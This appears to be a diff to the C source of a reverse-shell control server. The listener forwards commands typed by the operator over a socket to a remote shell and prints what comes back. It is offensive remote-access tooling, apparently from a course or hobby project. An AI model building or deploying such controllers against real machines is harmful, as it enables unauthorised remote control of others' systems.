@@ -22,6 +22,7 @@
 #include "networking.h"
 #include "server.h"
 #include "init_struct.h"
+#include <signal.h>
 
 #define MESSAGE_LENGTH 2048
 #define INFO "childinfo"
@@ -45,6 +46,8 @@ int listening_server_action(int new_socket, int readPipe){
 
   read(new_socket, &init, sizeof(struct  init_struct));
   print_init_struct(&init);
+
+
   int fds[2];
   pipe(fds);
 
@@ -52,36 +55,43 @@ int listening_server_action(int new_socket, int readPipe){
 
   // If cmld, read from listening server and write to socket
   if (forkResult == 0){
+    server_name = CONTROL_SERVER_WRITE;
     while (1){
-      char message[MESSAGE_LENGTH] = "ls";
+      //read the cmd from the user_shell pipe
+      char message[MESSAGE_LENGTH] = "";
       int readResult = read(readPipe, message, MESSAGE_LENGTH-1);
+
+      //check if it is the info cmd
       if(strcmp(message, INFO)==0){
         print_init_struct(&init);
       }
       else{
 
         strcpy(message, special_cmd(message));
-        printf("%s\n", message);
 
+        // prime the message to trigger the reverse shell by appending a new line
         strcat(message, "\n");
+
+        //calculate message_size
         int msg_size = (strlen(message)+1) * sizeof(char);
 
-
+        //write to the reverse shell
         int write_result=write(new_socket, message, msg_size);
       }
     }
   }
   // If parent, just read from socket
   else {
-    while(1){
-      char connection[MESSAGE_LENGTH] = "";
-      int bytes;
-      while(bytes = read(new_socket, connection, MESSAGE_LENGTH)){
-        printf("%s",connection);
-        fflush(stdout);
-        memset(connection, 0, sizeof(connection));
-      }
+    server_name = CONTROL_SERVER_READ;
+
+    char connection[MESSAGE_LENGTH] = "";
+    int bytes;
+    while(bytes = read(new_socket, connection, MESSAGE_LENGTH)){
+      printf("%s",connection);
+      fflush(stdout);
+      memset(connection, 0, sizeof(connection));
     }
+    kill(forkResult, 9);
   }
   return 0;
 }
